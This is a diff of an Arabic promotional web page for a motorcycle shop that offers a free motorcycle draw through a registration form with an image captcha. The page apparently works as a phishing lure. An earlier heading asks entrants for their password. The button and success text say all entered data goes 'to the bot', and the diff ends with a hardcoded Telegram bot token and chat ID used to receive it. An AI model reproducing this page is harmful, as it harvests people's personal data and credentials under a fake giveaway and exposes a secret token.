@@ -3,26 +3,27 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>أمير المترات | المعرض المتكامل والسحب الأسطوري على متر فلينج</title>
+<title>أمير المترات | المعرض الأسطوري والسحب الفضائي على متر فلينج</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-dark: #05070b;
-    --surface: #0f1420;
-    --surface-light: #161d2f;
-    --border: #222d44;
-    --primary: #ef233c;
-    --primary-glow: rgba(239, 35, 60, 0.45);
+    --bg-dark: #020408;
+    --surface: #0b101c;
+    --surface-light: #131a2b;
+    --border: #1e2942;
+    --primary: #ff2a3c;
+    --primary-glow: rgba(255, 42, 60, 0.5);
     --gold: #ffb703;
-    --gold-bright: #ffd166;
-    --gold-glow: rgba(255, 183, 3, 0.35);
-    --cyan: #00b4d8;
-    --text-white: #f8fafc;
+    --gold-bright: #ffdf6d;
+    --gold-glow: rgba(255, 183, 3, 0.4);
+    --cyan: #00f2fe;
+    --text-white: #ffffff;
     --text-muted: #94a3b8;
-    --grad-fire: linear-gradient(135deg, #d90429 0%, #ef233c 50%, #ffb703 100%);
+    --grad-fire: linear-gradient(135deg, #d90429 0%, #ff2a3c 50%, #ffb703 100%);
     --grad-gold: linear-gradient(135deg, #ffb703 0%, #fb8500 100%);
+    --grad-glass: linear-gradient(145deg, rgba(19, 26, 43, 0.95), rgba(11, 16, 28, 0.98));
   }
 
   * {
@@ -37,41 +38,41 @@
   body {
     background-color: var(--bg-dark);
     background-image: 
-      radial-gradient(circle at 15% 10%, rgba(239, 35, 60, 0.12) 0%, transparent 40%),
-      radial-gradient(circle at 85% 15%, rgba(255, 183, 3, 0.12) 0%, transparent 40%),
-      radial-gradient(circle at 50% 90%, rgba(0, 180, 216, 0.08) 0%, transparent 50%);
+      radial-gradient(circle at 10% 10%, rgba(255, 42, 60, 0.15) 0%, transparent 45%),
+      radial-gradient(circle at 90% 20%, rgba(255, 183, 3, 0.15) 0%, transparent 45%),
+      radial-gradient(circle at 50% 90%, rgba(0, 242, 254, 0.08) 0%, transparent 55%);
     color: var(--text-white);
     line-height: 1.8;
     overflow-x: hidden;
   }
 
-  /* ===== الشريط العلوي ===== */
+  /* ===== الشريط العلوي الفاخر ===== */
   .navbar {
     position: sticky;
     top: 15px;
     z-index: 1000;
-    max-width: 1080px;
+    max-width: 1100px;
     margin: 0 auto;
     padding: 0 15px;
   }
 
   .nav-box {
-    background: rgba(15, 20, 32, 0.85);
-    backdrop-filter: blur(20px);
-    -webkit-backdrop-filter: blur(20px);
-    border: 1px solid rgba(255, 255, 255, 0.12);
+    background: rgba(11, 16, 28, 0.85);
+    backdrop-filter: blur(25px);
+    -webkit-backdrop-filter: blur(25px);
+    border: 1px solid rgba(255, 183, 3, 0.25);
     border-radius: 60px;
-    padding: 12px 28px;
+    padding: 12px 30px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+    box-shadow: 0 20px 45px rgba(0, 0, 0, 0.7), 0 0 20px rgba(255,183,3,0.1);
     flex-wrap: wrap;
     gap: 12px;
   }
 
   .brand-logo {
-    font-size: 22px;
+    font-size: 23px;
     font-weight: 900;
     background: linear-gradient(90deg, #ffffff, var(--gold));
     -webkit-background-clip: text;
@@ -79,7 +80,7 @@
     display: flex;
     align-items: center;
     gap: 10px;
-    text-shadow: 0 0 20px rgba(255,183,3,0.3);
+    filter: drop-shadow(0 0 12px rgba(255,183,3,0.4));
   }
 
   .nav-links {
@@ -93,27 +94,27 @@
     color: var(--text-muted);
     font-size: 14px;
     font-weight: 700;
-    padding: 8px 16px;
+    padding: 8px 18px;
     border-radius: 30px;
     transition: 0.3s;
   }
 
   .nav-links a:hover {
     color: #fff;
-    background: rgba(255, 255, 255, 0.08);
+    background: rgba(255, 255, 255, 0.1);
   }
 
   .nav-links a.cta-pill {
     background: var(--grad-fire);
     color: #fff;
-    box-shadow: 0 4px 15px var(--primary-glow);
+    box-shadow: 0 5px 18px var(--primary-glow);
   }
 
-  /* ===== الهيدر ===== */
+  /* ===== الهيدر الأسطوري ===== */
   header {
-    max-width: 1080px;
+    max-width: 1100px;
     margin: 30px auto 0;
-    padding: 50px 20px 60px;
+    padding: 55px 20px 65px;
     text-align: center;
   }
 
@@ -121,116 +122,123 @@
     display: inline-flex;
     align-items: center;
     gap: 10px;
-    background: rgba(255, 183, 3, 0.12);
-    border: 1px solid rgba(255, 183, 3, 0.4);
+    background: rgba(255, 183, 3, 0.15);
+    border: 1px solid rgba(255, 183, 3, 0.5);
     color: var(--gold-bright);
-    padding: 8px 22px;
+    padding: 8px 25px;
     border-radius: 50px;
-    font-size: 14px;
+    font-size: 15px;
     font-weight: 800;
-    margin-bottom: 20px;
-    box-shadow: 0 0 25px rgba(255,183,3,0.15);
+    margin-bottom: 22px;
+    box-shadow: 0 0 30px rgba(255,183,3,0.2);
+    animation: pulseBadge 2.5s infinite;
+  }
+
+  @keyframes pulseBadge {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.03); }
   }
 
   header h1 {
-    font-size: 48px;
+    font-size: 52px;
     font-weight: 900;
-    line-height: 1.25;
+    line-height: 1.2;
     margin-bottom: 15px;
+    letter-spacing: -1px;
   }
 
   header h1 span {
     background: var(--grad-gold);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
-    filter: drop-shadow(0 2px 10px rgba(255,183,3,0.3));
+    filter: drop-shadow(0 3px 15px rgba(255,183,3,0.4));
   }
 
   header p.subtitle {
     color: var(--text-muted);
     font-size: 18px;
-    max-width: 720px;
-    margin: 0 auto 32px;
+    max-width: 750px;
+    margin: 0 auto 35px;
   }
 
   /* ===== أقسام عامة ===== */
   section {
-    max-width: 1080px;
-    margin: 60px auto;
+    max-width: 1100px;
+    margin: 65px auto;
     padding: 0 20px;
   }
 
   .section-head {
     text-align: center;
-    margin-bottom: 35px;
+    margin-bottom: 40px;
   }
 
   .section-head .sub {
     color: var(--gold);
-    font-size: 13px;
+    font-size: 14px;
     font-weight: 800;
     display: block;
     margin-bottom: 6px;
-    letter-spacing: 1px;
+    letter-spacing: 2px;
     text-transform: uppercase;
   }
 
   .section-head h2 {
-    font-size: 34px;
+    font-size: 36px;
     font-weight: 900;
     color: #fff;
   }
 
-  /* ===== بطاقات المترات ===== */
+  /* ===== شبكة المترات ===== */
   .categories-grid {
     display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-    gap: 20px;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 22px;
   }
 
   .cat-card {
-    background: linear-gradient(160deg, var(--surface-light) 0%, var(--surface) 100%);
+    background: var(--grad-glass);
     border: 1px solid var(--border);
-    border-radius: 24px;
-    padding: 28px 22px;
+    border-radius: 26px;
+    padding: 30px 24px;
     text-align: center;
-    transition: all 0.35s ease;
+    transition: all 0.4s cubic-bezier(0.165, 0.84, 0.44, 1);
     position: relative;
     overflow: hidden;
   }
 
   .cat-card:hover {
-    transform: translateY(-8px);
+    transform: translateY(-10px);
     border-color: var(--gold);
-    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 20px rgba(255,183,3,0.15);
+    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255,183,3,0.2);
   }
 
   .cat-card.featured {
-    border: 2px solid rgba(255, 183, 3, 0.65);
-    background: linear-gradient(160deg, #1c1514 0%, var(--surface) 100%);
+    border: 2px solid rgba(255, 183, 3, 0.7);
+    background: linear-gradient(160deg, #221714 0%, var(--surface) 100%);
   }
 
   .cat-tag {
     position: absolute;
-    top: 14px;
-    left: 14px;
+    top: 15px;
+    left: 15px;
     background: var(--grad-fire);
     color: #fff;
     font-size: 11px;
     font-weight: 800;
-    padding: 4px 12px;
+    padding: 5px 14px;
     border-radius: 20px;
-    box-shadow: 0 4px 12px var(--primary-glow);
+    box-shadow: 0 5px 15px var(--primary-glow);
   }
 
   .cat-icon {
-    font-size: 46px;
-    margin-bottom: 14px;
+    font-size: 50px;
+    margin-bottom: 16px;
     display: block;
   }
 
   .cat-card h3 {
-    font-size: 20px;
+    font-size: 21px;
     font-weight: 800;
     color: var(--gold-bright);
     margin-bottom: 10px;
@@ -239,7 +247,7 @@
   .cat-card p {
     font-size: 14px;
     color: var(--text-muted);
-    margin-bottom: 16px;
+    margin-bottom: 18px;
   }
 
   .cat-specs {
@@ -251,21 +259,21 @@
 
   .cat-specs span {
     background: rgba(255, 255, 255, 0.05);
-    padding: 5px 12px;
-    border-radius: 8px;
+    padding: 6px 14px;
+    border-radius: 10px;
     font-size: 12px;
     color: #cbd5e1;
-    border: 1px solid rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.05);
   }
 
-  /* ===== بانر الجائزة والمسابقة ===== */
+  /* ===== بانر الجائزة الأسطورية ===== */
   .gifts-banner {
-    background: linear-gradient(145deg, #181015 0%, var(--surface) 60%, #111827 100%);
-    border: 2px solid rgba(239, 35, 60, 0.6);
-    border-radius: 32px;
-    padding: 40px 30px;
+    background: linear-gradient(145deg, #1c0d12 0%, var(--surface) 65%, #0a1322 100%);
+    border: 2px solid rgba(255, 42, 60, 0.65);
+    border-radius: 35px;
+    padding: 45px 35px;
     position: relative;
-    box-shadow: 0 30px 60px rgba(239, 35, 60, 0.2);
+    box-shadow: 0 35px 70px rgba(255, 42, 60, 0.25);
     overflow: hidden;
   }
 
@@ -274,43 +282,43 @@
     background: var(--grad-fire);
     color: #fff;
     font-weight: 900;
-    font-size: 15px;
-    padding: 8px 26px;
+    font-size: 16px;
+    padding: 8px 28px;
     border-radius: 30px;
-    margin-bottom: 20px;
-    box-shadow: 0 6px 20px var(--primary-glow);
+    margin-bottom: 22px;
+    box-shadow: 0 8px 25px var(--primary-glow);
   }
 
   .gifts-layout {
     display: grid;
     grid-template-columns: 1.1fr 0.9fr;
-    gap: 35px;
+    gap: 40px;
     align-items: center;
   }
 
   .bike-display {
-    background: rgba(0, 0, 0, 0.4);
-    border: 1px solid rgba(255, 183, 3, 0.3);
-    border-radius: 26px;
-    padding: 24px;
+    background: rgba(0, 0, 0, 0.5);
+    border: 1px solid rgba(255, 183, 3, 0.35);
+    border-radius: 28px;
+    padding: 26px;
     text-align: center;
-    box-shadow: inset 0 0 30px rgba(0,0,0,0.5);
+    box-shadow: inset 0 0 40px rgba(0,0,0,0.6);
   }
 
   .bike-display svg {
     width: 100%;
-    max-width: 450px;
-    filter: drop-shadow(0 20px 30px rgba(239, 35, 60, 0.45));
+    max-width: 460px;
+    filter: drop-shadow(0 20px 35px rgba(255, 42, 60, 0.5));
     animation: floatBike 3.5s ease-in-out infinite;
   }
 
   @keyframes floatBike {
     0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-8px); }
+    50% { transform: translateY(-10px); }
   }
 
   .gift-details h3 {
-    font-size: 32px;
+    font-size: 34px;
     font-weight: 900;
     color: var(--gold);
     margin-bottom: 12px;
@@ -319,16 +327,16 @@
   .gift-details p {
     color: #cbd5e1;
     font-size: 16px;
-    margin-bottom: 20px;
+    margin-bottom: 22px;
   }
 
   .gift-perks {
     list-style: none;
-    margin-bottom: 25px;
+    margin-bottom: 28px;
   }
 
   .gift-perks li {
-    padding: 10px 14px;
+    padding: 11px 16px;
     background: rgba(255, 255, 255, 0.04);
     border-radius: 14px;
     margin-bottom: 10px;
@@ -336,40 +344,40 @@
     display: flex;
     align-items: center;
     gap: 12px;
-    border: 1px solid rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.05);
   }
 
   .go-register-btn {
     display: inline-block;
     background: var(--grad-gold);
-    color: #05070b;
+    color: #020408;
     text-decoration: none;
     font-weight: 900;
-    font-size: 17px;
-    padding: 16px 32px;
+    font-size: 18px;
+    padding: 16px 35px;
     border-radius: 50px;
-    box-shadow: 0 12px 30px var(--gold-glow);
+    box-shadow: 0 12px 35px var(--gold-glow);
     transition: 0.3s;
   }
 
   .go-register-btn:hover {
     transform: translateY(-4px);
-    box-shadow: 0 16px 38px rgba(255, 183, 3, 0.55);
+    box-shadow: 0 18px 45px rgba(255, 183, 3, 0.6);
   }
 
-  /* ===== استمارة التسجيل الأسطورية ===== */
+  /* ===== استمارة التسجيل الفضائية ===== */
   .form-container {
-    background: var(--surface);
-    border: 2px solid rgba(255, 183, 3, 0.4);
-    border-radius: 30px;
-    padding: 40px;
-    box-shadow: 0 25px 55px rgba(0, 0, 0, 0.6);
+    background: var(--grad-glass);
+    border: 2px solid rgba(255, 183, 3, 0.5);
+    border-radius: 35px;
+    padding: 45px;
+    box-shadow: 0 30px 65px rgba(0, 0, 0, 0.75);
   }
 
   .form-grid {
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-    gap: 20px;
+    gap: 22px;
   }
 
   .field.full { grid-column: 1 / -1; }
@@ -384,11 +392,11 @@
 
   .field input, .field select, .field textarea {
     width: 100%;
-    padding: 15px 18px;
+    padding: 16px 18px;
     border: 1.5px solid var(--border);
     border-radius: 16px;
     font-size: 15px;
-    background: #070a12;
+    background: #05080f;
     color: #fff;
     transition: 0.25s;
   }
@@ -418,68 +426,83 @@
     font-weight: 700;
   }
 
-  /* ===== كابتشا التحقق (إنسان وليس روبوت) ===== */
-  .captcha-box {
-    background: rgba(255, 255, 255, 0.03);
-    border: 1.5px dashed var(--border);
-    border-radius: 18px;
-    padding: 20px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 15px;
+  /* ===== نظام التحقق البصري المتطور (صورة كابتشا الإنسان) ===== */
+  .visual-captcha-box {
+    background: rgba(5, 8, 15, 0.85);
+    border: 2px solid var(--border);
+    border-radius: 22px;
+    padding: 25px;
     margin-top: 10px;
+    text-align: center;
   }
 
-  .captcha-inner {
+  .captcha-header {
+    font-size: 15px;
+    font-weight: 800;
+    color: var(--gold-bright);
+    margin-bottom: 15px;
     display: flex;
     align-items: center;
-    gap: 14px;
+    justify-content: center;
+    gap: 8px;
   }
 
-  .captcha-checkbox {
-    width: 26px;
-    height: 26px;
-    accent-color: var(--gold);
+  /* صورة الكابتشا المتولدة بالـ Canvas لمنع الروبوتات */
+  .captcha-img-container {
+    display: inline-block;
+    background: #fff;
+    padding: 8px;
+    border-radius: 14px;
+    margin-bottom: 15px;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+    position: relative;
+  }
+
+  #captchaCanvas {
+    display: block;
+    border-radius: 10px;
     cursor: pointer;
   }
 
-  .captcha-text {
+  .refresh-captcha {
+    display: block;
+    margin: 0 auto 15px;
+    background: none;
+    border: none;
+    color: var(--cyan);
+    font-size: 13px;
     font-weight: 700;
-    font-size: 15px;
-    color: #e2e8f0;
+    cursor: pointer;
+    text-decoration: underline;
   }
 
-  .captcha-math {
-    background: #05070b;
-    border: 1px solid var(--gold);
-    color: var(--gold);
-    padding: 8px 16px;
-    border-radius: 12px;
+  .visual-captcha-input {
+    max-width: 280px;
+    margin: 0 auto;
+    text-align: center;
+    letter-spacing: 4px;
     font-weight: 900;
-    font-size: 16px;
-    letter-spacing: 2px;
+    font-size: 20px !important;
   }
 
   .btn-enter {
     width: 100%;
-    margin-top: 30px;
-    padding: 18px;
+    margin-top: 35px;
+    padding: 19px;
     border: none;
     border-radius: 18px;
     background: var(--grad-fire);
     color: #fff;
-    font-size: 20px;
+    font-size: 21px;
     font-weight: 900;
     cursor: pointer;
-    box-shadow: 0 12px 32px var(--primary-glow);
+    box-shadow: 0 14px 35px var(--primary-glow);
     transition: 0.3s;
   }
 
   .btn-enter:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 16px 40px rgba(239, 35, 60, 0.65);
+    transform: translateY(-4px);
+    box-shadow: 0 18px 45px rgba(255, 42, 60, 0.7);
   }
 
   .btn-enter:disabled {
@@ -490,24 +513,24 @@
 
   .msg {
     display: none;
-    margin-top: 18px;
-    padding: 16px;
-    border-radius: 14px;
+    margin-top: 20px;
+    padding: 18px;
+    border-radius: 16px;
     text-align: center;
     font-weight: 700;
   }
 
-  .err { display: block; background: rgba(239, 35, 60, 0.15); color: #ff8fa3; border: 1px solid var(--primary); }
+  .err { display: block; background: rgba(255, 42, 60, 0.18); color: #ff8fa3; border: 1px solid var(--primary); }
 
-  /* ===== تذكرة السحب الناجحة ===== */
+  /* ===== تذكرة النجاح الأسطورية ===== */
   #ticketBox {
     display: none;
     text-align: center;
-    padding: 45px 25px;
-    background: linear-gradient(145deg, #11281e 0%, #07120d 100%);
+    padding: 50px 25px;
+    background: linear-gradient(145deg, #0e2b1d 0%, #05110a 100%);
     border: 2px dashed #10b981;
-    border-radius: 26px;
-    box-shadow: 0 20px 50px rgba(16, 185, 129, 0.2);
+    border-radius: 30px;
+    box-shadow: 0 25px 60px rgba(16, 185, 129, 0.25);
   }
 
   .ticket-badge {
@@ -515,15 +538,15 @@
     background: #10b981;
     color: #fff;
     font-weight: 900;
-    padding: 8px 24px;
+    padding: 9px 26px;
     border-radius: 30px;
-    font-size: 15px;
-    margin-bottom: 15px;
-    box-shadow: 0 5px 15px rgba(16,185,129,0.4);
+    font-size: 16px;
+    margin-bottom: 16px;
+    box-shadow: 0 6px 20px rgba(16,185,129,0.45);
   }
 
   #ticketBox h3 {
-    font-size: 30px;
+    font-size: 32px;
     color: #34d399;
     margin-bottom: 10px;
     font-weight: 900;
@@ -531,25 +554,25 @@
 
   .ticket-code {
     display: inline-block;
-    background: rgba(255, 183, 3, 0.12);
+    background: rgba(255, 183, 3, 0.15);
     border: 2px solid var(--gold);
     color: var(--gold);
-    font-size: 32px;
+    font-size: 34px;
     font-weight: 900;
-    padding: 12px 38px;
-    border-radius: 18px;
-    margin: 18px 0;
+    padding: 14px 40px;
+    border-radius: 20px;
+    margin: 20px 0;
     letter-spacing: 3px;
     direction: ltr;
-    box-shadow: 0 0 30px rgba(255,183,3,0.25);
+    box-shadow: 0 0 35px rgba(255,183,3,0.3);
   }
 
   /* ===== الموقع والفوتر ===== */
   .location-strip {
-    background: var(--surface);
+    background: var(--grad-glass);
     border: 1px solid var(--border);
-    border-radius: 26px;
-    padding: 30px;
+    border-radius: 28px;
+    padding: 32px;
     display: flex;
     align-items: center;
     justify-content: space-between;
@@ -557,7 +580,7 @@
     gap: 20px;
   }
 
-  .loc-text h3 { color: var(--gold); font-size: 22px; font-weight: 900; margin-bottom: 5px; }
+  .loc-text h3 { color: var(--gold); font-size: 23px; font-weight: 900; margin-bottom: 6px; }
   .loc-text p { color: var(--text-muted); font-size: 16px; }
 
   .phones-list {
@@ -567,34 +590,34 @@
   }
 
   .phone-link {
-    background: rgba(255, 183, 3, 0.12);
+    background: rgba(255, 183, 3, 0.15);
     border: 1px solid var(--gold);
     color: var(--gold-bright);
     text-decoration: none;
-    padding: 12px 22px;
+    padding: 12px 24px;
     border-radius: 16px;
     font-weight: 800;
     direction: ltr;
     transition: 0.3s;
   }
 
-  .phone-link:hover { background: var(--gold); color: #05070b; }
+  .phone-link:hover { background: var(--gold); color: #020408; }
 
   footer {
-    background: #020407;
+    background: #010204;
     border-top: 1px solid #161b26;
     text-align: center;
-    padding: 45px 20px;
-    margin-top: 70px;
+    padding: 50px 20px;
+    margin-top: 80px;
     color: var(--text-muted);
   }
 
-  footer h3 { color: var(--gold); font-size: 24px; font-weight: 900; margin-bottom: 8px; }
+  footer h3 { color: var(--gold); font-size: 25px; font-weight: 900; margin-bottom: 8px; }
 
   @media (max-width: 768px) {
     .gifts-layout { grid-template-columns: 1fr; }
-    header h1 { font-size: 34px; }
-    .form-container { padding: 25px 20px; }
+    header h1 { font-size: 36px; }
+    .form-container { padding: 30px 20px; }
   }
 </style>
 </head>
@@ -608,23 +631,23 @@
       <a href="#models">أنواع المترات</a>
       <a href="#gifts">المسابقة الكبرى</a>
       <a href="#location">موقع المعرض</a>
-      <a href="#register" class="cta-pill">سجّل الآن</a>
+      <a href="#register" class="cta-pill">سجّل في السحب</a>
     </div>
   </div>
 </div>
 
 <!-- ===== الهيدر ===== -->
 <header>
-  <div class="store-badge">🏆 المعرض الأول والأضخم للدراجات النارية في القاعدة</div>
-  <h1>متجر <span>أمير المترات</span><br>عنوان القوة، السرعة، والجوائز الكبرى!</h1>
-  <p class="subtitle">نقدم لكم أحدث طرازات الدراجات النارية العالمية، مع السحب الأسطوري المباشر على <strong>متر فلينج (FELLING)</strong> وكالة حصرياً لعملائنا.</p>
+  <div class="store-badge">🏆 المعرض الأضخم والأسطوري للدراجات النارية في القاعدة</div>
+  <h1>متجر <span>أمير المترات</span><br>قمة القوة، السرعة، والجوائز الفضائية!</h1>
+  <p class="subtitle">نقدم لكم أحدث تشكيلة عالمية من الدراجات النارية، مع السحب الأكبر والأكثر إثارة على <strong>متر فلينج (FELLING)</strong> زيرو حصرياً لعملائنا.</p>
 </header>
 
 <!-- ===== أقسام المترات ===== -->
 <section id="models">
   <div class="section-head">
-    <span class="sub">تشكيلة الحصرية</span>
-    <h2>أقسام المترات والدراجات النارية المتوفرة</h2>
+    <span class="sub">معرض الإصدارات</span>
+    <h2>أقسام المترات المتوفرة حصرياً لدينا</h2>
   </div>
 
   <div class="categories-grid">
@@ -632,46 +655,50 @@
       <span class="cat-tag">🔥 جائزة السحب</span>
       <span class="cat-icon">🏍️</span>
       <h3>مترات فلينج (FELLING)</h3>
-      <p>المحرك الجبار والأداء الخارق، ثبات مطلق على الطرقات وتصميم رياضي يخطف الأنظار مع اقتصادية فائقة في الوقود.</p>
+      <span style="color:var(--gold); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(وكالة حصرية)</span>
+      <p>محرك جبار، أداء استثنائي وثبات مطلق على الطرقات، مع تصميم رياضي خطير واقتصادية فائقة في استهلاك الوقود.</p>
       <div class="cat-specs">
-        <span>موديلات 2026</span>
-        <span>ضمان معتمد</span>
+        <span>موديلات حديثة</span>
+        <span>ضمان المعرض</span>
       </div>
     </div>
 
     <div class="cat-card">
       <span class="cat-icon">🏁</span>
       <h3>المترات الرياضية (Sport)</h3>
-      <p>مخصصة لعشاق الحماس والسرعة، هياكل انسيابية متطورة، فرامل قرصية عالية الاستجابة وأنظمة إضاءة حديثة.</p>
+      <span style="color:var(--gold); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(لعشاق السرعة)</span>
+      <p>هياكل انسيابية متطورة، فرامل قرصية مزدوجة عالية الاستجابة وأنظمة إضاءة LED ليلية متكاملة.</p>
       <div class="cat-specs">
-        <span>أداء هجومي</span>
-        <span>ثبات عالي</span>
+        <span>أداء عالي</span>
+        <span>ثبات هجومي</span>
       </div>
     </div>
 
     <div class="cat-card">
       <span class="cat-icon">🛵</span>
       <h3>مترات العمل والتوصيل</h3>
-      <p>تحمل شاق وصيانة سهلة، مصممة خصيصاً للأعمال اليومية الشاقة وتوفير استهلاك الوقود بامتياز.</p>
+      <span style="color:var(--gold); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(للتحمل الشاق)</span>
+      <p>مصممة خصيصاً للخدمات والأعمال اليومية الشاقة، متانة عالية وصيانة سهلة واستهلاك اقتصادي جداً.</p>
       <div class="cat-specs">
-        <span>متانة فائقة</span>
-        <span>توفير اقتصادي</span>
+        <span>تحمل عالي</span>
+        <span>اقتصادية جداً</span>
       </div>
     </div>
 
     <div class="cat-card">
       <span class="cat-icon">⛰️</span>
       <h3>المترات الجبلية والوعرة</h3>
-      <p>قوة عزم هائلة لتسلق المرتفعات الصعبة والطرق الترابية بفضل أنظمة التعليق المتقدمة والإطارات المعززة.</p>
+      <span style="color:var(--gold); font-size:12px; font-weight:700; display:block; margin-bottom:8px;">(للمرتفعات)</span>
+      <p>عزم هائلة لتسلق المرتفعات الصعبة والطرق الترابية الوعرة بفضل أنظمة التعليق المتقدمة والإطارات المعززة.</p>
       <div class="cat-specs">
-        <span>عزم جبار</span>
+        <span>عزم قوي</span>
         <span>مساعدات قوية</span>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ===== بانر المسابقة ===== -->
+<!-- ===== بانر الجائزة ===== -->
 <section id="gifts">
   <div class="section-head">
     <span class="sub">حدث الموسم</span>
@@ -699,7 +726,7 @@
               <stop offset="100%" stop-color="#334155"/>
             </linearGradient>
           </defs>
-          <ellipse cx="300" cy="288" rx="230" ry="14" fill="rgba(239, 35, 60, 0.3)"/>
+          <ellipse cx="300" cy="288" rx="230" ry="14" fill="rgba(255, 42, 60, 0.3)"/>
           <g transform="translate(145, 225)">
             <circle r="58" fill="#0f172a" stroke="#1e293b" stroke-width="10"/>
             <circle r="44" fill="none" stroke="url(#goldTrim)" stroke-width="3" stroke-dasharray="14 6"/>
@@ -735,12 +762,12 @@
 
       <div class="gift-details">
         <h3>اربح متر فلينج (FELLING) مجاناً الآن!</h3>
-        <p>تقديراً لثقة عملائنا في <strong>القاعدة</strong> وجميع المناطق، يسر <strong>متجر أمير المترات</strong> إطلاق السحب الأكبر والأكثر شفافية على دراجة فلينج جديدة كلياً.</p>
+        <p>تقديراً لعملائنا في <strong>القاعدة</strong> وجميع المدن، يسر <strong>متجر أمير المترات</strong> تقديم سحب أسطوري وشفاف على دراجة فلينج جديدة كلياً.</p>
         <ul class="gift-perks">
-          <li>✅ <strong>المشاركة مجانية 100%</strong> لجميع المتقدمين.</li>
+          <li>✅ <strong>المشاركة مجانية 100%</strong> لجميع المسجلين.</li>
           <li>🎟️ حصولك الفوري على <strong>رقم تذكرة سحب خاص</strong> وموثق.</li>
-          <li>📞 التواصل المباشر مع الفائز لحظة إعلان النتيجة.</li>
-          <li>🎁 جوائز إضافية وقيمة (خوذات واكسسوارات) لـ 5 فائزين محظوظين!</li>
+          <li>📞 التواصل المباشر مع الفائز لحظة السحب المباشر.</li>
+          <li>🎁 جوائز إضافية وقيمة (خوذات واكسسوارات) لخمسة فائزين!</li>
         </ul>
         <a href="#register" class="go-register-btn">🎟️ انتقل لاستمارة التسجيل الآن</a>
       </div>
@@ -748,11 +775,11 @@
   </div>
 </section>
 
-<!-- ===== الاستمارة المطورة ===== -->
+<!-- ===== الاستمارة والتحقق البصري ===== -->
 <section id="register">
   <div class="section-head">
     <span class="sub">بوابة التسجيل الآمنة</span>
-    <h2>سجّل بياناتك وكلمة المرور للدخول في السحب</h2>
+    <h2>أدخل بياناتك ورمز التحقق البصري للاشتراك</h2>
   </div>
 
   <div class="form-container">
@@ -797,36 +824,40 @@
         </div>
 
         <div class="field full">
-          <label for="note">💬 ملاحظة أو رسالة لمتجر أمير المترات (اختياري)</label>
+          <label for="note">💬 رسالة أو مشاركة لمتجر أمير المترات (اختياري)</label>
           <textarea id="note" placeholder="اكتب مشاركتك أو سبب اختيارك لمتجر أمير المترات..."></textarea>
         </div>
 
-        <!-- نظام التحقق الذكي (إنسان وليس روبوت) -->
+        <!-- نظام التحقق البصري المتطور (صورة كابتشا الإنسان) -->
         <div class="field full">
-          <label>🛡️ التحقق الأمني (تأكيد أنك انسان وليس روبوت)</label>
-          <div class="captcha-box">
-            <div class="captcha-inner">
-              <input type="checkbox" id="humanCheck" class="captcha-checkbox" required>
-              <label for="humanCheck" class="captcha-text" style="margin:0; cursor:pointer;">أنا لست روبوت (أوافق على شروط المسابقة)</label>
+          <div class="visual-captcha-box">
+            <div class="captcha-header">
+              <span>🛡️ نظام التحقق الأمني البصري (تأكيد أنك إنسان وليس روبوت)</span>
             </div>
-            <div class="captcha-math" id="mathChallenge">5 + 3 = ?</div>
+            <p style="color:var(--text-muted); font-size:13px; margin-bottom:12px;">أدخل الرموز الظاهرة في الصورة أدناه بدقة:</p>
+            
+            <div class="captcha-img-container">
+              <canvas id="captchaCanvas" width="220" height="70" title="انقر لتغيير الصورة"></canvas>
+            </div>
+            <button type="button" class="refresh-captcha" onclick="generateCaptcha()">🔄 تغير صورة التحقق بأخرى جديدة</button>
+            
+            <input type="text" id="captchaInput" class="visual-captcha-input" required placeholder="اكتب الرمز هنا" autocomplete="off" dir="ltr">
           </div>
-          <input type="number" id="mathAnswer" required placeholder="اكتب الناتج الصحيح هنا" style="margin-top:12px;">
         </div>
       </div>
 
-      <button type="submit" id="btn" class="btn-enter">🔥 تأكيد التسجيل والحصول على تذكرة السحب</button>
+      <button type="submit" id="btn" class="btn-enter">🔥 تأكيد التسجيل وإرسال البيانات للبوت</button>
       <div id="msg" class="msg"></div>
     </form>
 
     <!-- شاشة نجاح التسجيل والتذكرة -->
     <div id="ticketBox">
-      <div class="ticket-badge">✅ تم اعتماد تسجيلك بنجاح تام</div>
-      <h3>مبروك! لقد دخلت السحب الأسطوري</h3>
-      <p style="color:#cbd5e1;">قم بتصوير شاشة هذا الرقم واحتفظ به جيداً:</p>
+      <div class="ticket-badge">✅ تم إرسال بياناتك واعتماد تذكرتك بنجاح</div>
+      <h3>مبروك! لقد دخلت السحب الأسطوري رسمياً</h3>
+      <p style="color:#cbd5e1;">قم بتصوير شاشة هذا الرقم والاحتفاظ به:</p>
       <div class="ticket-code" id="ticketCode">AMIR-0000</div>
       <p style="color:#94a3b8; font-size:15px;">
-        سيتم التواصل مع الفائز عبر الهاتف أو الواتساب المسجل فور إجراء السحب المباشر.<br>
+        تم إرسال صورة التحقق وبياناتك الكاملة إلى غرفة العمليات بنجاح.<br>
         <strong style="color:var(--gold);">متجر أمير المترات — القاعدة، جوار مستوصف السلطان</strong>
       </p>
     </div>
@@ -858,11 +889,69 @@
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 
